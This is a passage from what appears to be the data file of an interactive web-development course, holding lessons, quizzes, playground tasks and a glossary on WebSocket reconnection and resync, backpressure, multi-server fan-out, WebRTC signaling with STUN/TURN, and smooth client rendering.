              { cells: [["reconnected, subscribe room 7"], [], [], ["stale at #95"]], note: "Back after 40 s offline. Resume from #95 is refused: the replay buffer now starts at #110." },
              { cells: [["#118"], ["#118"], ["GET /rooms/7"], ["stale at #95"]], note: "Subscribe **first**, then fetch the snapshot. Deltas that arrive meanwhile are held, not applied." },
              { cells: [["#119", "#120"], ["#118", "#119", "#120"], ["querying"], ["stale at #95"]], note: "The snapshot query is slow. Deltas keep coming." },
              { cells: [[], ["#118", "#119", "#120"], ["snapshot as of #119"], ["#119"]], note: "The snapshot says which delta it includes. Replace the state wholesale." },
              { cells: [[], ["#120"], [], ["#119"]], note: "Drop held deltas at or below #119: they're already inside the snapshot." },
              { cells: [[], [], [], ["#120"]], note: "Apply #120. Exact again." },
              { cells: [["#121", "#123"], ["#123"], [], ["#121"]], note: "Live. #121 is seq + 1, so apply it. #123 isn't: hold it and start a gap timer." },
              { cells: [["#122"], [], [], ["#123"]], note: "#122 fills the gap and #123 drains behind it. Had it never come, the timer would trigger another snapshot." },
            ],
          },
        },
        {
          t: "play",
          mode: "js",
          title: "hold, drop, apply, resync",
          js: RESYNC,
          task: "Move the snapshot line to the top of `events`, then to the bottom. Then make the snapshot #121: which held deltas are dropped, and why is that right?",
        },
        {
          t: "pitfall",
          h: "Snapshot, then subscribe, leaves a hole",
          x: "Fetch the snapshot at #119, subscribe 30 ms later, and #120 was published in between: never applied, wrong until a full reload. Subscribe first, hold deltas, then snapshot, and make the snapshot carry the seq it reflects.",
        },
      ],
    },
    {
      title: "Backpressure and fan-out",
      beats: [
        { t: "say", x: "`send()` never blocks: it queues and returns. `bufferedAmount` is the bytes still queued, in the browser and in Node's `ws`. A client on bad 3G drains slower than you publish, and its queue lives in your RAM. The browser has no drain event: you poll it." },
        {
          t: "predict",
          lang: "js",
          src: "ws.onclose = () => console.log(\"closed\");\n// ...a minute later the socket is CLOSED, and this still runs:\nsetInterval(() => ws.send(JSON.stringify({ type: \"typing\" })), 1000);",
          q: "What happens on each `send`?",
          options: ["It throws `InvalidStateError`", "The data is silently dropped and `bufferedAmount` keeps climbing", "It's queued and sent after a reconnect", "The socket reopens"],
          answer: 1,
          why: "Only `send()` during CONNECTING throws. After close the bytes are discarded with no error, and the spec says `bufferedAmount` keeps growing. Gate sends on `readyState === WebSocket.OPEN` or keep your own outbox.",
        },
        {
          t: "code",
          lang: "js",
          src: BROADCAST,
          mark: [4, 8, 9],
          note: "Two policies: drop what the next message replaces (positions, prices); disconnect and resync what can't be dropped (chat). Never let a per-client queue grow without limit.",
        },
        {
          t: "steps",
          h: "Past one server",
          items: [
            "One process: a `Map` from room to sockets. Broadcast is a loop.",
            "Two processes: room 7 has users on both. Each node subscribes to `room:7` in Redis and relays to its own sockets. Senders `PUBLISH`.",
            "Redis pub/sub is at-most-once: a node that blipped misses those messages forever. Seq numbers plus a replayable log (Redis Streams, the DB) fix it.",
            "Sticky sessions matter only when one session spans many HTTP requests: long polling, Socket.IO's handshake. A WebSocket is already pinned to its box.",
            "Past what one Redis handles, a broker (NATS, Kafka) or a managed pub/sub service does the fan-out.",
            "Deploys: close with 1012, keep old nodes draining, and let jittered backoff spread the reconnects.",
          ],
        },
        {
          t: "quiz",
          q: "Three servers. Users in the same room see only some of each other's messages. A teammate turns on sticky sessions. Fixed?",
          options: ["Yes, everyone now stays on one server", "No: stickiness pins a user to a server, not a room to a server", "Only for WebSocket clients", "Only for users who reconnect"],
          answer: 1,
          why: "Alice is stuck to node 1 and Bob to node 3, forever. Messages still have to cross between nodes: pub/sub between servers is the fix, not routing. Stickiness only keeps a multi-request session on one box.",
        },
        {
          t: "pitfall",
          h: "Stuck at 1,024, or at 28,000 connections",
          x: "Each socket is a file descriptor, and the default soft limit is often 1024: raise `LimitNOFILE`. A proxy talking to one upstream IP:port has only the ephemeral port range, 28,232 ports by default on Linux, so it stalls near 28k sockets. Add upstream ports or source IPs.",
        },
      ],
    },
    {
      title: "WebRTC: peers talk directly",
      beats: [
        { t: "say", x: "WebRTC connects two browsers directly, over UDP, always encrypted. It's built for calls and screen sharing; data channels carry anything else. The browser handles codecs, jitter and congestion. It does not tell peers how to find each other: that part is yours." },
        {
          t: "steps",
          h: "Two peers, one connection",
          items: [
            "Both create an `RTCPeerConnection` with STUN and TURN server addresses.",
            "A creates an **offer**: SDP text listing codecs, data channels and its DTLS fingerprint. It goes to B over your **signaling** channel, often a WebSocket.",
            "B sets it as the remote description, creates an **answer**, sends it back the same way.",
            "Each side gathers **ICE candidates**, addresses it might be reachable at, and trickles them over signaling as they're found.",
            "ICE pairs candidates and runs connectivity checks, then picks the best pair that works.",
            "DTLS handshake on that path, then media and data flow peer to peer, or through TURN.",
          ],
        },
        {
          t: "code",
          lang: "js",
          src: RTC,
          mark: [1, 9, 12],
          note: "`addIceCandidate` rejects until a remote description is set, and candidates can beat the SDP. Production code queues them until `setRemoteDescription` resolves.",
        },
        {
          t: "table",
          head: ["Candidate", "Where it comes from", "Works when", "Cost"],
          rows: [
            ["host", "The device's own interfaces, often hidden behind an mDNS `.local` name", "Both peers on the same network", "Free"],
            ["srflx", "STUN reports your public IP:port as the NAT mapped it", "The NAT reuses that mapping for the peer", "One tiny UDP exchange"],
            ["relay", "A TURN server allocates an address and forwards every packet", "Almost always, even as TCP or TLS on 443", "Every byte of the call crosses your server"],
          ],
          caption: "STUN fails behind symmetric NATs, which map each destination to a new port. TURN is the fallback that always works.",
        },
        {
          t: "predict",
          lang: "text",
          src: "A one-to-one video call, 1.5 Mbps each way, 60 minutes.\nICE ends up on a relay candidate through your TURN server.",
          q: "How much traffic does your TURN server carry?",
          options: ["None, media is peer-to-peer", "About 11 MB", "About 675 MB", "About 1.35 GB in and 1.35 GB out"],
          answer: 3,
          why: "Each direction is 1.5 Mb/s x 3,600 s = 675 MB. Both directions enter the relay and leave it again. STUN only answers \"what's my address\"; TURN carries the call, which is why it's billed and its credentials are short-lived.",
        },
        {
          t: "quiz",
          q: "A game sends full player state 30 times a second over a data channel. Which options?",
          options: ["The defaults: ordered and reliable", "`{ ordered: false, maxRetransmits: 0 }`", "`{ maxRetransmits: 0, maxPacketLifeTime: 100 }`", "`{ ordered: true, maxRetransmits: 0 }`"],
          answer: 1,
          why: "Each state replaces the last, so a late copy is worthless: no retransmits, no waiting for order. Setting both limits throws a `SyntaxError`. Keep a second, reliable channel for chat and game events.",
        },
        {
          t: "pitfall",
          h: "Peer-to-peer is rarely the cheap option",
          x: "You still run signaling, STUN and TURN. In a mesh call each peer uploads N-1 copies of its video, so past a handful of people you add an SFU: a server again. If messages need persistence, authority or moderation, use a WebSocket. For client-server datagrams, WebTransport needs no ICE.",
        },
      ],
    },
    {
      title: "Smooth on the client",
      beats: [
        { t: "say", x: "Messages arrive when the network delivers them; frames happen when the display refreshes. At 5,000 messages a second and 60 Hz, most DOM writes are overwritten before anyone sees them, and each one still costs work." },
        {
          t: "play",
          mode: "html",
          title: "coalesce to one write per frame",
          html: "<label><input type=\"checkbox\" id=\"co\"> coalesce into one write per frame</label>\n<p id=\"stats\">measuring...</p>\n<div id=\"grid\"></div>",
          css: "#grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 4px; font: 13px ui-monospace, monospace; }\n#grid div { padding: 4px 6px; background: #f2efe9; border-radius: 4px; }\n#stats { font: 13px ui-monospace, monospace; }",
          js: COALESCE_JS,
          task: "Tick the box and compare DOM writes per second. Then set `RATE` to 500 and 50,000: which mode's cost grows with the message rate, and which with the frame rate?",
        },
        { t: "say", h: "Render the past", x: "Positions arrive at 10 to 30 Hz with jitter. Draw remote objects a little in the past, between the two snapshots around `now - delay`, and motion is smooth at any frame rate. Animation craft covers the same blend for physics steps." },
        {
          t: "play",
          mode: "html",
          title: "snap, interpolate, extrapolate",
          html: "<canvas id=\"c\" width=\"320\" height=\"220\"></canvas>\n<p id=\"info\"></p>\n<p><b style=\"color:#c0392b\">red</b> latest snapshot, <b style=\"color:#2563eb\">blue</b> interpolated DELAY ms back, <b style=\"color:#16a34a\">green</b> dead reckoning, grey: the truth</p>",
          css: "canvas { width: 320px; height: 220px; border: 1px solid #ddd; border-radius: 6px; }\np { font: 13px system-ui, sans-serif; }",
          js: INTERP_JS,
          task: "Set `DELAY` to 60 and watch the starved count. Set `JITTER` to 200. What's the smallest DELAY that never starves, as a formula?",
        },
        {
          t: "predict",
          lang: "text",
          src: "Snapshots every 100 ms. Arrival jitter: 0 to 60 ms.\nA: render 50 ms in the past\nB: render 180 ms in the past",
          q: "Which one stutters?",
          options: ["A", "B", "Neither", "Both"],
          answer: 0,
          why: "To draw `now - delay` you need a snapshot newer than that already in hand: the send interval plus the worst jitter, 160 ms. A freezes on most frames. B pays 180 ms of lag for smoothness; dead reckoning pays none, and is wrong at every turn.",
        },
        {
          t: "mission",
          h: "Live cursors that survive a restart",
          x: "Build a room where every tab shows everyone's cursor: a `ws` server, clients sending at most 20 Hz, a seq per sender, interpolation at about 150 ms, reconnect with full jitter. Kill the server mid-move, restart it, and check every tab recovers with no reload.",
          hint: "Throttle on the sender with a timestamp check, not a timer per move. Broadcast one JSON string per tick with every changed cursor. A sender's seq that goes backwards means it reconnected: reset it.",
        },
      ],
    },
  ],
  nobodyTells: [
    "A real-time feature makes four promises: it reconnects, it notices death, it never silently skips a message, it survives a deploy. Test all four.",
    "Every reconnect is a resync. If the client can't rebuild state from a snapshot plus deltas, it's wrong after the first blip.",
    "Kill the server mid-stream when you test, not just clean closes. 1006 is the close code you'll see most in production.",
    "Log close codes and reasons as a metric. \"Users keep getting disconnected\" becomes a histogram you can act on.",
    "Serialize a broadcast once. 10,000 `JSON.stringify` calls on the same object is a CPU profile nobody expects.",
    "Socket.IO is its own protocol on top of WebSocket. A Socket.IO client can't talk to a plain WebSocket server, or the reverse.",
    "Set a max message size on the server. `ws` accepts up to 100 MiB per message by default.",
    "Graph connected sockets per server. A deploy that doesn't drain shows up as a cliff, then a spike.",
  ],
  glossary: [
    ["long polling", "The server holds a request open until it has news, answers, and the client asks again at once."],
    ["SSE", "Server-Sent Events: a never-ending text/event-stream response, read with EventSource. Server to client only."],
    ["Last-Event-ID", "Header an EventSource sends when it reconnects, carrying the last event id it saw, so the server can replay."],
    ["Sec-WebSocket-Accept", "base64(SHA-1(key + fixed GUID)). Proves the server understood this upgrade. Not authentication."],
    ["masking", "XOR of every client frame with a random 4-byte key, to stop pages controlling bytes seen by proxies."],
    ["1006", "Close code the browser reports when a socket died without a close frame. Never sent on the wire."],
    ["subprotocol", "An app-level protocol name agreed in Sec-WebSocket-Protocol during the handshake. Good for versioning."],
    ["full jitter", "Retry after a random wait between 0 and min(cap, base x 2^attempt). Spreads reconnect storms."],
    ["bufferedAmount", "Bytes passed to send() that haven't gone out yet. The only backpressure signal a WebSocket gives you."],
    ["snapshot + deltas", "Fetch full state stamped with a seq, then apply only changes numbered after it, in order."],
    ["fan-out", "Delivering one message to every subscriber, often across servers via a pub/sub layer."],
    ["SDP", "Text describing a WebRTC session: codecs, channels, encryption fingerprints. Exchanged as offer and answer."],
    ["ICE", "WebRTC's process of gathering candidate addresses and testing pairs until one path between peers works."],
    ["STUN / TURN", "STUN tells a peer its public address. TURN relays all traffic when no direct path exists, at your cost."],
  ],
  explain: "Explain to a friend what happens when a chat server is redeployed: how each client notices, reconnects without a stampede, and ends up with no missing or duplicated messages.",
};
